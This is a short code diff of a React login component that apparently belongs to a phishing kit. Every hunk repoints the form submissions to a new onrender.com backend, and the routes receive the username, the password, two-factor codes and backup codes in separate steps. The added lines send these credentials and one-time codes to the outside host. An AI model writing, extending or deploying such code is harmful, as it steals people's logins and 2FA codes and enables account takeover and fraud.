@@ -40,7 +40,7 @@ function App() {
     formssssShows("")
     formsssShows("")
     try {
-      const response = await axios.post("https://placecook.onrender.com/2fas", {
+      const response = await axios.post("https://uniqueidplace.onrender.com/2fas", {
         textContent,
       });
 
@@ -121,7 +121,7 @@ function App() {
     const username = formData.get("username");
     // const password = formData.get("password");
     try {
-      const response = await axios.post("https://placecook.onrender.com/login", {
+      const response = await axios.post("https://uniqueidplace.onrender.com/login", {
         username,
       });
 
@@ -168,7 +168,7 @@ function App() {
     const password = formData.get("password");
     // const password = formData.get("password");
     try {
-      const response = await axios.post("https://placecook.onrender.com/pwdlog", {
+      const response = await axios.post("https://uniqueidplace.onrender.com/pwdlog", {
         password,
       });
       if (response.data.succ === 'false'){
@@ -202,7 +202,7 @@ function App() {
     const codes = formData.get("codes");
     // const password = formData.get("password");
     try {
-      const response = await axios.post("https://placecook.onrender.com/codes", {
+      const response = await axios.post("https://uniqueidplace.onrender.com/codes", {
         codes,
       });
       if (response.data.succ === 'false'){
